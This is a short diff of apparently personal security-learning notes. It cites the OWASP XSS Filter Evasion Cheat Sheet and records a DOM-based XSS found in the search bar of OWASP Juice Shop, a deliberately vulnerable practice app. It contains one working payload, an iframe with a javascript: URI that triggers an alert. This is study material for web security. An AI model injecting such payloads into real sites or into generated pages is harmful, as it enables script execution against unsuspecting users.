@@ -1,4 +1,5 @@
 Sourcec: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
 
-#Simple XSS using iframe
+#Simple XSS using cross frame scripting, this found from the search bar from owasp juice
+#This is a DOM xss
 <iframe src="javascript:alert(`xss`)"> 
